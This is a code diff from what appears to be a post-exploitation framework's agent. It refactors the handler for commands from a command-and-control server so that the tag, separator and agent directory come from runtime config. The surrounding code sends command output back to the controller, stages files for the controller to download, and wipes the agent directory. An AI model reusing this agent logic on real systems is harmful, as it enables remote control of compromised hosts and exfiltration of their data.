@@ -24,9 +24,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		outCombined []byte
 		err         error
 	)
-	data2send.Tag = emp3r0r_data.AgentTag
+	data2send.Tag = RuntimeConfig.AgentTag
 
-	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
+	payloadSplit := strings.Split(data.Payload, RuntimeConfig.MagicString)
 	if len(payloadSplit) <= 1 {
 		log.Printf("Cannot parse CC command: %s, wrong OpSep maybe?", data.Payload)
 		return
@@ -39,11 +39,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	// send response to CC
 	sendResponse := func(resp string) {
 		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
-			emp3r0r_data.OpSep,
+			RuntimeConfig.MagicString,
 			strings.Join(cmdSlice, " "),
-			emp3r0r_data.OpSep,
+			RuntimeConfig.MagicString,
 			out)
-		data2send.Payload += emp3r0r_data.OpSep + cmd_id // cmd_id for cmd tracking
+		data2send.Payload += RuntimeConfig.MagicString + cmd_id // cmd_id for cmd tracking
 		if err = Send2CC(&data2send); err != nil {
 			log.Println(err)
 		}
@@ -88,9 +88,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 
 		// move to agent root
-		err = os.Rename(out, emp3r0r_data.AgentRoot+"/"+out)
+		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
 		if err == nil {
-			out = emp3r0r_data.AgentRoot + "/" + out
+			out = RuntimeConfig.AgentRoot + "/" + out
 		}
 
 		// tell CC where to download the file
@@ -101,7 +101,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-		err = os.RemoveAll(emp3r0r_data.AgentRoot)
+		err = os.RemoveAll(RuntimeConfig.AgentRoot)
 		if err != nil {
 			log.Fatalf("Failed to cleanup files")
 		}
